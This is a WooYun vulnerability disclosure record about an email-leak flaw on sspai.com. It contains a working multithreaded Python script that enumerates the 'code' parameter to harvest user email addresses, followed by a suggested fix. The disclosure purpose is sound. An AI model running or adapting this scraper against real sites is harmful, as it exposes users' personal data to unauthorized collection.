{"id": 41449, "wybug_id": "wooyun-2014-088772", "wybug_title": "少数派用户邮箱泄露(附验证脚本)", "wybug_corp": "少数派", "wybug_author": "orange", "wybug_date": "2014-12-29 10:25", "wybug_open_date": "2015-02-12 10:26", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 少数派-发现优质应用 详细说明：  url：\nsspai.com/account/emailsuccess?code=1\n发送验证邮件的时候未进行校验邮箱是否激活，通过遍历可获取所有用户邮箱\n\n修改了白帽子Morker的脚本，试了一下\n\n   漏洞证明：  验证脚本:\n#!/usr/bin/env python#coding:utf-8import threadingimport re,timeimport requestsfrom Queue import Queuedef getUrl():    url = []    for i in xrange(1,5000):         page = \"http://sspai.com/account/emailsuccess?code=\" + str(i)        url.append(page)    print \"---------------Scan starting---------------\"    return urlclass GetMail(threading.Thread):    def __init__(self,queue):        threading.Thread.__init__(self)        self.queue = queue        self.headers = {'User-Agent' : 'Mozilla/5.0;'}        self.key = re.compile(r'(\\w+.*?@.*? )')        self.start()    def run(self):        while True:            if con.acquire():                if self.queue.empty():                    con.release()                    break                else:                    page = self.queue.get()                    code = requests.get(page,headers=self.headers).text                    mail = self.key.findall(code)                    if len(mail) == 1:                        print mail[0]                    else:                        pass                con.release()con = threading.Lock()def main():    threads = []    pages = getUrl()    queue = Queue()    for i in range(len(pages)):        queue.put(pages[i])    for i in range(50):        t = GetMail(queue)        threads.append(t)    for i in threads:        i.join()    print \"---------------Scan ebding---------------\"if __name__ == \"__main__\":    main()\n   修复方案：  增加权限验证，搞一个未激活用户，然后登录后才可以发送验证邮件，或者加密防止被猜出大量url地址   版权声明：转载请注明来源 orange@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}